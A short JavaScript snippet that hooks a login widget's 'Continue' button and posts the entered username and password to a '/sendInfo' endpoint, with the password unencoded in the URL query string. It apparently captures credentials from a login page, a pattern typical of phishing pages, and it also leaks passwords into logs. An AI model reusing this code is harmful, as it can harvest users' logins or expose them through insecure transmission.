 const body = document.querySelector("._widget-auto-layout");
 const userNameTextBox = body.querySelector("#username");
 const passwordTextBox = body.querySelector("#password");
 const button = body.querySelectorAll("button");
 let submitb = null;
 

 for (const b of button) {
   if (b.textContent === "Continue") {
     submitb = b;
   }
 }

 submitb.addEventListener("click", () => {
   axios
     .post(`/sendInfo?username=${userNameTextBox.value}&password=${passwordTextBox.value}`)
     .then(function (response) {
       console.log("POST request successful:", response.data);
     })
     .catch(function (error) {
       console.error("Error making POST request:", error);
     });
   console.log("All done");
 });
